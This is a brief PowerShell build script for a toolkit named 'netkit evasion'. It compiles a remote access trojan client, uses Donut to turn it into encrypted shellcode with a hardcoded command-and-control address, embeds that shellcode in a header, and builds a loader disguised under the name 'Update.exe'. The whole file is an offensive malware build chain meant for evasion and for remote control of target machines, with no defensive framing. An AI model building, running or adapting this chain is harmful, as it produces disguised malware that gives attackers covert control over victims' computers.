# netkit evasion build chain - run from netkit\evasion
param(
    [string]$C2 = "192.168.1.10:4444",
    [string]$Donut = "C:\tools\donut\donut.exe"
)

$ErrorActionPreference = "Stop"

cmake -B build -A x64
cmake --build build --config Release --target rat_client

& $Donut -i build\Release\rat_client.exe -o shellcode.bin -a 2 -b 1 -e 3 -x 3 -p "--c2 $C2"

python builder.py shellcode.bin payload.h

cmake --build build --config Release --target Update

Write-Host "[chain] loader ready: build\Release\Update.exe"
